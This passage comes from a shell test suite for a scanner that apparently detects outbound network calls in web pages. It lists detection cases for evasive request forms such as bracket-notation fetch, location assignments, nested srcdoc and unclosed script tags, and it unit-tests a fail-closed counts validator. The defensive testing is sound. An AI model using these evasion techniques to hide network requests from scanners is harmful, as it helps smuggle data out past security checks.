check "markup-shaped JS string stays clean"           0 ""       "$T/r7markwstring"
check_count "optional fetch call count==1"            1 1        "$T/r7optional"
check_count "window bracket fetch count==1"           1 1        "$T/r7bracketfetch"
check "same-origin path containing double slash stays clean" 0 "" "$T/r7localdouble"
check "standalone JS markup string stays clean"       0 ""       "$T/r7jsmarkup"
check "HTML body code example stays clean"            0 ""       "$T/r7bodycode"
check_count "window.location assignment count==1"     1 1        "$T/r7winloc"
check_count "document.location assignment count==1"   1 1        "$T/r7docloc"
check_count "window bracket location count==1"        1 1        "$T/r7bracketloc"
check_count "decoded srcdoc nested fetch count==1"    1 1        "$T/r7srcdoc"
check_count "space-separated ping URLs count==2"      1 2        "$T/r7ping2"
check_count "CSS image-set candidates count==2"       1 2        "$T/r7image2"
check_count "chained bracket location href count==1"  1 1        "$T/r7brackethref"
check_count "apostrophe-leading WHATWG host count==1" 1 1        "$T/r7quotehost"
check_count "bang-leading WHATWG host count==1"       1 1        "$T/r7banghost"
check_count "unclosed script executes through EOF"    1 1        "$T/r7unclosedscript"
check_count "unclosed style parses through EOF"       1 1        "$T/r7unclosedstyle"
check_count "nested srcdoc unclosed script count==1"  1 1        "$T/r7srcdocunclosed"

# S1: unit-test the REAL trusted-counts validator lifted from the shipped scanner. A honest canonical
# record is accepted; every producer/runtime fault (leading-zero/octal, overflow, extra line, no
# trailing newline, trailing garbage, NUL, wrong arity, non-ASCII) is REJECTED so the gate fails closed.
CFNS="$(mktemp)"
awk '
  $0 ~ /^is_canon_count\(\) \{/ {p=1}
  $0 ~ /^validate_counts_file\(\) \{/ {p=1}
  p {print}
  p && $0=="}" {p=0}
' "$SCAN" > "$CFNS"
# shellcheck source=/dev/null
. "$CFNS"
CT="$(mktemp -d)"
counts_accepts() { printf '%b' "$2" > "$CT/c"; if validate_counts_file "$CT/c" >/dev/null; then ok "$1"; else no "$1 (rejected a canonical record)"; fi; }
counts_rejects() { printf '%b' "$2" > "$CT/c"; if validate_counts_file "$CT/c" >/dev/null; then no "$1 (accepted a fault -> would fail OPEN)"; else ok "$1"; fi; }
counts_accepts "S1 counts accept 0 0 0"          '0 0 0\n'
counts_accepts "S1 counts accept 3 1 2"          '3 1 2\n'
counts_accepts "S1 counts accept 9-digit max"    '999999999 0 0\n'
counts_rejects "S1 counts reject leading-zero 08" '08 0 0\n'
counts_rejects "S1 counts reject overflow"       '99999999999999999999 0 0\n'
counts_rejects "S1 counts reject 10-digit field" '1000000000 0 0\n'
counts_rejects "S1 counts reject extra line"     '0 0 0\n99 0 0\n'
counts_rejects "S1 counts reject no newline"     '0 0 0'
counts_rejects "S1 counts reject trailing junk"  '0 0 0\nx'
counts_rejects "S1 counts reject embedded NUL"   '0 0 0\000\n'
counts_rejects "S1 counts reject 2 fields"       '0 0\n'
counts_rejects "S1 counts reject 4 fields"       '0 0 0 0\n'
counts_rejects "S1 counts reject non-ASCII"      '0 0 \303\251\n'
rm -rf "$CT" "$CFNS"

echo
echo "RESULT pass=$pass fail=$fail"
[ "$fail" -eq 0 ]
